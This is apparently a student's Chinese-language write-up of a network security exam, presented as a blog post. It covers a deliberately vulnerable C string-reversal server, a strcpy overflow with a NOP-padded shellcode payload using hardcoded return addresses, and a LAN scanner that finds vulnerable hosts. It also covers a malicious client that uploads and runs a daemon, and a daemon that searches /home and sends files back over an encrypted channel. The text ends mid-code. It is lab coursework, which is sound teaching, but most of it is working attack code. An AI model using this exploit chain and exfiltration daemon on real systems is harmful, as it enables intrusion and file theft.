<li><p>查阅了很多资料，这次考试基本上是对这门课所学的、所实验的东西进行了一个汇总。这一学期也不容易，因为学的东西多呀，所以实验和大作业都很多。虽然花了很多时间，但还是很有收获的。</p>
</li>
<li><p>本次写shellcode遇到了一些困难，列举如下:</p>
<ul>
<li>不清楚如何对不够4字节整数的字符串进行控制避免<code>00</code>字节——<ul>
<li>可以通过call</li>
<li>也可以通过linux中：<code>/</code>&lt;=&gt;<code>/////</code>   、 <code>x</code>&lt;=&gt;<code>./////x</code>等来实现4字节整数</li>
</ul>
</li>
<li>编译的位数问题，由于32位和64位的系统调用有所不同，如果想用32位的系统调用号，就要<ul>
<li><code>nasm -felf32 wget.nasm -o wget.o</code><br><code>ld -m elf_i386 wget.o -o wget</code></li>
</ul>
</li>
<li>对寄存器进行操作时出现操作数和寄存器的大小不一，出现<code>00</code>字节<ul>
<li>解决方法：<code>eax 32bit</code>  <code>ax 16bit</code>  <code>ah al 8bit</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="任务一-字符串前后翻转服务端程序"><a href="#任务一-字符串前后翻转服务端程序" class="headerlink" title="任务一 字符串前后翻转服务端程序"></a>任务一 字符串前后翻转服务端程序</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
<blockquote>
<p>由于栈溢出的漏洞已经调过很多种类了：字符串复制栈溢出、整数栈溢出、格式化字符串栈溢出、堆溢出等等</p>
<p>而这次的实验，我觉得重点不在于漏洞的复杂性，所以索性编写了strcpy()函数栈溢出漏洞。</p>
</blockquote>
<p>string前后翻转服务端程序，我使用c语言编写简单的sokcet服务，将客户端发来的字符串翻转之后回送。</p>
<h2 id="1-1-漏洞原理"><a href="#1-1-漏洞原理" class="headerlink" title="1.1 漏洞原理"></a>1.1 漏洞原理</h2><p>缓冲区溢出漏洞在于处理字符串时<strong>main()-&gt;reverse()-&gt;foo()-&gt;strcpy()</strong>中，由于<code>strcpy()</code>在复制字符串时并未检查字符串的长度，使输入内容可以超过bufferA的空间，从而实现栈溢出，覆盖返回地址，跳到我们填入的shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了实现攻击，我们构造输入str，使其超出bufferA的部分恰好覆盖ebp的值和foo函数的栈返回ret，使该ret内容指向我们的shellcode，然后在foo返回之后即顺势跳到我们的shellcode，劫持成功。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221417113-1593172509344.png" alt="image-20200621221417113"></p>
<p>如下为调试图</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221754210-1593172509345.png" alt="image-20200621221754210"></p>
<p>从图上可以看到，ebp位于<code>bufferA+108</code>（我把GS关了），而<code>bufferA只有100字节</code>，很奇怪</p>
<p>回头看了之前project1栈溢出实验中6个vul中的foo函数，他们都是foo函数中创建了buffer，然后调用一个漏洞函数来执行的，大概的格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//5个栈溢出vul的基本格式</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">200</span>]; <span class="comment">//&lt;---在foo函数中只创建了一个局部变量，就call了下一个函数</span></span><br><span class="line">    nstrcpy(buf, <span class="keyword">sizeof</span> buf, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我写的漏洞函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到：<code>在foo函数中只创建了一个局部变量，就call了下一个函数</code></p>
<p>而我的函数也是这种格式，却产生了<code>bufferA只有100字节，ebp却位于bufferA+108</code>问题，这里表示疑惑，毕竟我所有的安全机制都关了。总而言之，不知道这8个字节意义是什么，但是却不影响我们溢出，所以暂且不管了。</p>
<blockquote>
<p>（RELRO：RELRO会有<strong>Partial RELRO</strong>和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表）</p>
</blockquote>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622164819499.png" alt="image-20200622164819499"></p>
<p>为了溢出，我们的shellcode可以如下拼接。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用于拼接字符串demon,具体的拼接函数可以选择三个shellcode进行拼接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    payload = shellcode + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode)) <span class="comment">#shellcode以及nop</span></span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span> <span class="comment">#109字节处开始写ebp，ret</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span>  <span class="comment">#payload结束</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>下图为<code>装载了创建文件的shellcode的payload</code>调试成功，成功创建<code>LinFengLv.txt</code></p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221839431-1593172509345.png" alt="image-20200621221839431"></p>
<h2 id="1-2-收发数据"><a href="#1-2-收发数据" class="headerlink" title="1.2 收发数据"></a>1.2 收发数据</h2><p>逆转字符串程序主要在reverse()中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="comment">//strncpy(buf,str,strlen(str));</span></span><br><span class="line">	<span class="comment">//assert(str);</span></span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">	<span class="comment">//主要的收发业务部分</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">        <span class="comment">//处理业务</span></span><br><span class="line">		reverse(buf);</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="任务二、恶意客户端程序"><a href="#任务二、恶意客户端程序" class="headerlink" title="任务二、恶意客户端程序"></a>任务二、恶意客户端程序</h1><p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
<h2 id="2-1-扫描找到有该漏洞的服务端机器"><a href="#2-1-扫描找到有该漏洞的服务端机器" class="headerlink" title="2.1 扫描找到有该漏洞的服务端机器"></a>2.1 扫描找到有该漏洞的服务端机器</h2><p>主要是</p>
<ul>
<li>通过socket尝试连接<code>&#39;8.8.8.8&#39;</code>（任意），<code>socket.getsockname()[0]</code>获得本机的局域网ip</li>
<li>通过本机ip计算出所有局域网的ip</li>
<li>尝试socket连接局域网的ip的服务端端口（这里是8000），找出有运行服务端程序的机器</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">port_list = [<span class="string">"8000"</span>] <span class="comment">#默认扫描8000</span></span><br><span class="line">routers = [] <span class="comment">#扫描出的ip和端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机局域网ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义扫描函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="comment"># 把新建的线程放到线程池</span></span><br><span class="line">            all_threads.append(t)</span><br><span class="line">    <span class="comment"># 循环阻塞主线程，等待每一字子线程执行完，程序再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> all_threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(routers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket访问IP函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_ip</span><span class="params">(new_ip, port)</span>:</span></span><br><span class="line">    <span class="comment"># 创建TCP套接字，链接新的ip列表</span></span><br><span class="line">    scan_link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment"># 设置链接超时时间</span></span><br><span class="line">    scan_link.settimeout(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 链接地址(通过指定我们 构造的主机地址，和扫描指定端口)</span></span><br><span class="line">    result = scan_link.connect_ex((new_ip, port))</span><br><span class="line">    scan_link.close()</span><br><span class="line">    <span class="comment"># 判断链接结果</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 加锁</span></span><br><span class="line">        lock.acquire()</span><br><span class="line">        print(new_ip, <span class="string">'\t\t端口号%s开放'</span> % port)</span><br><span class="line">        routers.append((new_ip, port))</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        lock.release()</span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    启动扫描程序</span><br><span class="line">    ports=input(<span class="string">"输入想要扫描的端口"</span>)</span><br><span class="line">    port_list = port_list.append(ports.split(<span class="string">' '</span>))</span><br><span class="line">    print(port_list)</span><br><span class="line">    search_routers()</span><br></pre></td></tr></table></figure>

<h2 id="2-2-正常通信——字符串前后翻转"><a href="#2-2-正常通信——字符串前后翻转" class="headerlink" title="2.2 正常通信——字符串前后翻转"></a>2.2 正常通信——字符串前后翻转</h2><p>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>): </span><br><span class="line">    input_data = input(<span class="string">"send:"</span>) <span class="comment">#输入要发送的字符串</span></span><br><span class="line">    <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:   <span class="comment">#quit退出socket连接</span></span><br><span class="line">        input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">        clientsocket.send(input_data)  <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))<span class="comment"># 这里要发字节流</span></span><br><span class="line">    data = clientsocket.recv(<span class="number">1024</span>)  <span class="comment">#收到的翻转字符串</span></span><br><span class="line">    print(<span class="string">"recv:"</span>, data)</span><br></pre></td></tr></table></figure>

<h2 id="2-3-exploit功能"><a href="#2-3-exploit功能" class="headerlink" title="2.3 exploit功能"></a>2.3 exploit功能</h2><p>发送针对漏洞的payload（包含shellcode）</p>
<p>shellcode的字节代码已经在全局变量写了，程序通过对我们输入的判断（1234等）来判断我们要用哪种模式。</p>
<p>工作模式有【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出），其中1~3是exploit攻击，其他的则是正常通信。</p>
<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621223352350.png" alt="image-20200621223352350"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#通信主体函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发字节流</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发字节流形式</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<h1 id="任务三、daemon程序"><a href="#任务三、daemon程序" class="headerlink" title="任务三、daemon程序"></a>任务三、daemon程序</h1><p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
<p>程序 daemon，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</p>
<h2 id="3-1-搜索服务器上的任意指定文件"><a href="#3-1-搜索服务器上的任意指定文件" class="headerlink" title="3.1 搜索服务器上的任意指定文件"></a>3.1 搜索服务器上的任意指定文件</h2><p>如下代码所示，其可以在指定的目录下，搜索我们指定文件名的文件，并且将其路径保存在routes中。</p>
<p>主要是使用了pythond的os库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">routes=[] <span class="comment">#路径数组</span></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br></pre></td></tr></table></figure>

<h2 id="3-2-利用网络传送指定文件给客户端"><a href="#3-2-利用网络传送指定文件给客户端" class="headerlink" title="3.2 利用网络传送指定文件给客户端"></a>3.2 利用网络传送指定文件给客户端</h2><p>如下代码所示，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#根据恶意客户端的要求，做出应答（如搜索发送文件）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span> </span><br><span class="line">    recvData=json.loads(recvData) <span class="comment">#将恶意客户端发送来的数据json格式化</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>: <span class="comment">#如果是方式Method是get_file，就要搜索发送文件</span></span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>]) </span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>]) <span class="comment">#搜索指定的文件</span></span><br><span class="line">        print(routes) <span class="comment">#打印找到的路径</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span> <span class="comment">#返回指定的文件名和内容</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file，则发hello</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br></pre></td></tr></table></figure>



<h1 id="任务四、密钥管理机制和传输加密方案"><a href="#任务四、密钥管理机制和传输加密方案" class="headerlink" title="任务四、密钥管理机制和传输加密方案"></a>任务四、密钥管理机制和传输加密方案</h1><p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
<h2 id="4-1-密钥管理机制和传输加密方案"><a href="#4-1-密钥管理机制和传输加密方案" class="headerlink" title="4.1 密钥管理机制和传输加密方案"></a>4.1 密钥管理机制和传输加密方案</h2><p>客户端发送非对称加密RSA公钥给服务端，服务端创建对称加密AES密钥发送给客户端，之后两方通过AES进行通信</p>
<ul>
<li><p>首先daemon.py作为服务器（受害方）被shellcode启动</p>
</li>
<li><p>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</p>
</li>
<li><p>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</p>
</li>
<li><p>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</p>
</li>
</ul>
<h3 id="客户端（攻击方）代码"><a href="#客户端（攻击方）代码" class="headerlink" title="客户端（攻击方）代码"></a>客户端（攻击方）代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">   <span class="comment"># ===========向服务端（daemon）发RSA的公钥及其SHA256摘要=================</span></span><br><span class="line"><span class="comment"># 向服务端传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">   <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">   print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">   sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">   sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">   clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line">   <span class="comment"># ===========接受服务端传递的AES对称密钥，并验证是否被改动，解密==============</span></span><br><span class="line">   <span class="comment"># 接受服务端传递的密钥并进行解密</span></span><br><span class="line">   symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">   <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">       <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">       print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line">   <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">   AES = Fernet(self.symKey)</span><br><span class="line">   <span class="comment"># =====================AES密钥接收成功，下面是业务代码================</span></span><br></pre></td></tr></table></figure>

<h3 id="服务端（daemon）代码"><a href="#服务端（daemon）代码" class="headerlink" title="服务端（daemon）代码"></a>服务端（daemon）代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">       clientSocket, addr = self.serverSocket.accept() <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">       print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))<span class="comment"># 打印</span></span><br><span class="line">       </span><br><span class="line">       <span class="comment"># ===========接收客户端发来的RSA公钥，并验证是否被改动=================</span></span><br><span class="line">       <span class="comment"># 接受客户端传递的公钥,哈希函数检验公钥的正确性,运用pickle进行反序列化</span></span><br><span class="line">       publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">       <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">           <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">           print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">       <span class="comment"># ===========下面是用RSA公钥加密AES对称密钥，发送密文及其SHA256摘要的过程=======</span></span><br><span class="line">       <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">       sym_key = Fernet.generate_key()</span><br><span class="line">       <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">       <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">       en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">       en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">       print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">       clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">       <span class="comment"># =====================AES密钥发送成功，下面是业务代码================</span></span><br><span class="line">       print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">       <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">       AES = Fernet(sym_key)</span><br><span class="line">       <span class="comment"># 下面使用AES对称密钥进行加密对话的过程</span></span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           time.sleep(<span class="number">0.3</span>)</span><br><span class="line">           recvData = clientSocket.recv(<span class="number">1024</span>) <span class="comment"># 接收到的消息</span></span><br><span class="line"></span><br><span class="line">           <span class="comment"># ============接收解密=================</span></span><br><span class="line">           recvData = AES.decrypt(recvData).decode()  <span class="comment">#接收解密</span></span><br><span class="line">           <span class="comment"># ================不解密=================</span></span><br><span class="line">           <span class="comment">#recvData = recvData.decode()</span></span><br><span class="line"></span><br><span class="line">           print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">           sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">           </span><br><span class="line">           <span class="comment"># ============加密发送=================</span></span><br><span class="line">            sendData = AES.encrypt(sendData.encode())<span class="comment"># 对消息进行加密</span></span><br><span class="line">            clientSocket.send(sendData)</span><br><span class="line">           <span class="comment"># 